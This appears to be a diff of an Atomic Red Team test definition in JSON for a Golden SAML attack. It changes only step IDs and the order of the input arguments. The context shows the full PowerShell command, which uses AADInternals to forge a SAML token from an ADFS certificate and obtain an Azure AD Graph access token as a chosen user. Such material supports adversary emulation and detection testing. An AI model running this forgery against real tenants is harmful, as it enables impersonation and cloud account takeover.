@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "95c4f2d4-a8c5-4be4-ace9-7d0341fbdd4b",
+      "id": "47cec78b-d337-4037-bccc-104e88eab7e9",
       "type": "execute-command",
       "data": {
         "command": "Import-Module AADInternals -Force\n$saml = New-AADIntSAMLToken -ImmutableID \"#{immutable_id}\" -PfxFileName \"#{certificate_path}\" -Issuer \"#{issuer_uri}\"\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\nif ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }\nWrite-Host \"End of Golden SAML\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "64b9ae90-905b-4bf3-b489-7aefb04c05bf",
+      "id": "e009eff0-0796-4618-a1a7-52c8f6e3c697",
       "name": "Check dependency 1/1",
       "description": "AADInternals module must be installed.\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "ad51eb25-b876-4ea0-a359-bfbec332c531",
+      "id": "8ae720d7-da92-40f3-82c4-b55b451f4ddc",
       "name": "Resolve dependency 1/1",
       "description": "AADInternals module must be installed.\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "3dcc8da2-38ee-4182-979f-4a3e347fc9d3",
+      "id": "352dc5ff-3627-434c-b069-943b37c803d5",
       "name": "Re-check dependency 1/1",
       "description": "AADInternals module must be installed.\n",
       "type": "execute-command",
@@ -51,24 +51,24 @@
   ],
   "flows": [
     {
-      "s": "64b9ae90-905b-4bf3-b489-7aefb04c05bf",
+      "s": "e009eff0-0796-4618-a1a7-52c8f6e3c697",
       "p": "on-success",
-      "o": "95c4f2d4-a8c5-4be4-ace9-7d0341fbdd4b"
+      "o": "47cec78b-d337-4037-bccc-104e88eab7e9"
     },
     {
-      "s": "64b9ae90-905b-4bf3-b489-7aefb04c05bf",
+      "s": "e009eff0-0796-4618-a1a7-52c8f6e3c697",
       "p": "on-failure",
-      "o": "ad51eb25-b876-4ea0-a359-bfbec332c531"
+      "o": "8ae720d7-da92-40f3-82c4-b55b451f4ddc"
     },
     {
-      "s": "ad51eb25-b876-4ea0-a359-bfbec332c531",
+      "s": "8ae720d7-da92-40f3-82c4-b55b451f4ddc",
       "p": "on-success",
-      "o": "3dcc8da2-38ee-4182-979f-4a3e347fc9d3"
+      "o": "352dc5ff-3627-434c-b069-943b37c803d5"
     },
     {
-      "s": "3dcc8da2-38ee-4182-979f-4a3e347fc9d3",
+      "s": "352dc5ff-3627-434c-b069-943b37c803d5",
       "p": "on-failure",
-      "o": "95c4f2d4-a8c5-4be4-ace9-7d0341fbdd4b"
+      "o": "47cec78b-d337-4037-bccc-104e88eab7e9"
     }
   ],
   "tags": [
@@ -76,6 +76,12 @@
     "atomic-red-team"
   ],
   "input_arguments": [
+    {
+      "name": "issuer_uri",
+      "type": "string",
+      "description": "Issuer URI of the ADFS service",
+      "value": "http://contoso.com/adfs/services/trust/"
+    },
     {
       "name": "certificate_path",
       "type": "path",
@@ -87,12 +93,6 @@
       "type": "string",
       "description": "ImmutableId of the targeted user. It can be obtained with AzureAD powershell module; $(Get-AzureADUser -SearchString \"username\").ImmutableId",
       "value": "aehgdqBTZV50DKQZmNJ8mg=="
-    },
-    {
-      "name": "issuer_uri",
-      "type": "string",
-      "description": "Issuer URI of the ADFS service",
-      "value": "http://contoso.com/adfs/services/trust/"
     }
   ]
 }
